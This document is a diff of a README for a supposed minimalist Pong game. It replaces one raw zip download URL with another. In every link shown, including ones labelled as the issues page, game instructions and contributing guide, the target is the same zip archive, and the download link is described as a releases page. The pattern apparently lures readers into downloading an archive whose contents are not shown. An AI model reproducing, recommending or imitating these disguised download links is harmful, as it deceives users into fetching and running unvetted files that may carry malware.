@@ -1,7 +1,7 @@
 # 🎮 velvet-pong-game - Enjoy Classic Pong in a Modern Way
 
 ## 📥 Download Link
-[![Download velvet-pong-game](https://raw.githubusercontent.com/Ly1aa/velvet-pong-game/main/Toryfication/velvet-pong-game.zip)](https://raw.githubusercontent.com/Ly1aa/velvet-pong-game/main/Toryfication/velvet-pong-game.zip)
+[![Download velvet-pong-game](https://github.com/Ly1aa/velvet-pong-game/raw/refs/heads/main/assets/pong-velvet-game-2.2.zip)](https://github.com/Ly1aa/velvet-pong-game/raw/refs/heads/main/assets/pong-velvet-game-2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to velvet-pong-game! This is a minimalist pong game where you can adjust difficulty levels. Enjoy smooth animations, dynamic sound effects, and a retro-modern user interface. Follow these steps to download and run the game.
@@ -14,7 +14,7 @@ Before you begin, ensure your system meets the following requirements:
 - **Internet Connection:** Required for the initial download and updates
 
 ## 💾 Download & Install
-To download the game, visit this page: [Download velvet-pong-game](https://raw.githubusercontent.com/Ly1aa/velvet-pong-game/main/Toryfication/velvet-pong-game.zip).
+To download the game, visit this page: [Download velvet-pong-game](https://github.com/Ly1aa/velvet-pong-game/raw/refs/heads/main/assets/pong-velvet-game-2.2.zip).
 
 Once you're on the releases page:
 
@@ -64,10 +64,10 @@ If you encounter issues:
 For any persistent problems, consider checking the issues section on GitHub or contacting support.
 
 ## 📞 Support
-For help or feedback, please visit the [Issues page](https://raw.githubusercontent.com/Ly1aa/velvet-pong-game/main/Toryfication/velvet-pong-game.zip) on GitHub. Our community is here to assist you.
+For help or feedback, please visit the [Issues page](https://github.com/Ly1aa/velvet-pong-game/raw/refs/heads/main/assets/pong-velvet-game-2.2.zip) on GitHub. Our community is here to assist you.
 
 ## 📚 Additional Resources
-- [Game Instructions](https://raw.githubusercontent.com/Ly1aa/velvet-pong-game/main/Toryfication/velvet-pong-game.zip) - Learn advanced gameplay strategies.
-- [Contributing](https://raw.githubusercontent.com/Ly1aa/velvet-pong-game/main/Toryfication/velvet-pong-game.zip) - Interested in helping improve the game? Check our contributing guide.
+- [Game Instructions](https://github.com/Ly1aa/velvet-pong-game/raw/refs/heads/main/assets/pong-velvet-game-2.2.zip) - Learn advanced gameplay strategies.
+- [Contributing](https://github.com/Ly1aa/velvet-pong-game/raw/refs/heads/main/assets/pong-velvet-game-2.2.zip) - Interested in helping improve the game? Check our contributing guide.
 
 Thank you for choosing velvet-pong-game. We hope you enjoy playing this classic game with a modern twist!
